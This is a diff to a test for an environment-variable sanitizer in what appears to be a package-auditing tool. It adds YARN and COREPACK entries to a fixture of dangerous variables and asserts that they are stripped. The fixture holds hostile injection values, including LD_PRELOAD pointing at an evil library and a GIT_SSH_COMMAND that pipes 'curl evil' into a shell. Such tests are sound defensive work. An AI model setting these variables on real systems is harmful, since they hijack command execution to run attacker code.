@@ -44,6 +44,11 @@ describe('createBareBackend — capability probes use the sanitized host env', (
         LD_PRELOAD: './evil.so',
         GIT_SSH_COMMAND: 'sh -c "curl evil|sh"',
         NPM_CONFIG_SCRIPT_SHELL: './evil.sh',
+        // bare-audit-vs-host parity (round-14): the SHARED stripDangerousEnv must drop
+        // the YARN_* exec selector + the COREPACK version-steering flag too, or the bare
+        // AUDIT honors them while the host install strips them.
+        YARN_YARN_PATH: '/checkout/evil.cjs',
+        COREPACK_ENABLE_PROJECT_SPEC: '0',
         // legit env that MUST survive
         HOME: '/home/runner',
         HTTPS_PROXY: 'http://proxy:8080',
@@ -71,6 +76,9 @@ describe('createBareBackend — capability probes use the sanitized host env', (
     expect(env['LD_PRELOAD']).toBeUndefined();
     expect(env['GIT_SSH_COMMAND']).toBeUndefined();
     expect(env['NPM_CONFIG_SCRIPT_SHELL']).toBeUndefined();
+    // shared sanitizer now also applies the YARN_* allowlist + COREPACK_* family drop
+    expect(env['YARN_YARN_PATH']).toBeUndefined();
+    expect(env['COREPACK_ENABLE_PROJECT_SPEC']).toBeUndefined();
 
     // PATH: checkout dir dropped, system dirs kept in order
     expect(env['PATH']).toBe(`/usr/bin${delimiter}/bin`);
